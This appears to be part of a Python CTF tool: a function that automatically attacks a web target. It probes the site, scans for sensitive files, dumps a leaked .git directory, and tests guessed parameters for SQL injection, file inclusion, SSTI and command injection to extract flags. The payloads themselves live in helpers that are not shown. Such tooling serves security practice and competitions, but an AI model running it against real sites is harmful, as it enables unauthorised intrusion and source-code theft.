    """Web 一键自动解题：信息收集 → 敏感文件/.git → 各参数打 SQLi/LFI/SSTI/RCE。

    返回 {"steps": [...], "flags": [...], "evidence": [...], "log": [...]}
    """
    url = normalize_url(url)
    started = time.time()
    steps: list[str] = []
    flags: list[str] = []
    evidence: list[str] = []
    log: list[str] = []

    def say(msg: str) -> None:
        log.append(msg)
        if on_progress:
            on_progress(msg)

    def add_flag(found: list[str], step: str, payload: str = "") -> None:
        new = [f for f in found if f not in flags]
        if new:
            steps.append(step)
            flags.extend(new)
            if payload:
                evidence.append(payload)

    say(f"① 信息收集：{url}")
    lines, found, resp = probe_site(url, timeout=10)
    for l in lines:
        say("   " + l)
    add_flag(found, f"访问目标站点 {url}，在响应内容/响应头中得到 flag")

    say("② 扫描敏感文件与备份文件")
    slines, sfound = scan_sensitive(url, on_progress=lambda m: say("   " + m))
    for l in slines:
        say("   " + l)
    for l in slines:
        if "★" in l and "字节" in l:
            add_flag([h.value for h in find_flags(l)], f"扫描到敏感文件：{l.split('★')[0].strip()}")
    for l in slines:
        if ".git/HEAD" in l and "200" in l:
            import tempfile
            target_dir = outdir or os.path.join(tempfile.gettempdir(), "ctf_git_dump")
            say("   发现 .git 泄露，开始恢复源码…")
            glines, gflags = git_dump(url, target_dir, on_progress=lambda m: say("   " + m))
            for gl in glines:
                say("   " + gl)
            add_flag(gflags, f"发现 .git 源码泄露，恢复出源码后在 "
                             f"{target_dir} 中找到 flag", f"GET {url.rstrip('/')}/.git/HEAD")
            break

    if flags and time.time() - started < 20:
        return {"steps": steps, "flags": flags, "evidence": evidence, "log": log}

    say("③ 猜参数并测试常见注入")
    params = guess_params(resp.text if resp else "", url)
    say(f"   候选参数：{params}")
    scanners = [("SQL 注入", sqli_scan), ("文件包含", lfi_scan),
                ("SSTI 模板注入", ssti_scan), ("命令注入", rce_scan)]
    base = url.split("?")[0]
    for p in params:
        if time.time() - started > time_budget or flags:
            break
        for label, fn in scanners:
            if time.time() - started > time_budget or flags:
                break
            test_url = _inject_params(base + "?" + urllib.parse.urlencode({p: "1"}), p, "1")
            say(f"   测试 {label}：参数 {p}")
            try:
                rlines, rflags = fn(test_url, p, on_progress=lambda m: None)
            except Exception as exc:  # noqa: BLE001
                say(f"      {label} 探测异常：{exc}")
                continue
            hit = [l for l in rlines if "★" in l]
            for l in hit:
                say("      " + l)
            if rflags:
                add_flag(rflags, f"参数 `{p}` 存在 {label}："
                                 + (hit[0].replace("★", "").strip() if hit else ""),
                         f"{label} payload → {test_url}")
            elif hit:
                evidence.append(f"{label} 探测命中（需手工利用）：{hit[0]}")

    if not flags:
        say("④ 未能自动取到 flag，建议：看源码审计结果、换参数名、"
            "或把 Burp 抓到的原始请求丢进「HTTP 请求重放器」手工调")
    return {"steps": steps, "flags": sorted(set(flags)), "evidence": evidence, "log": log}
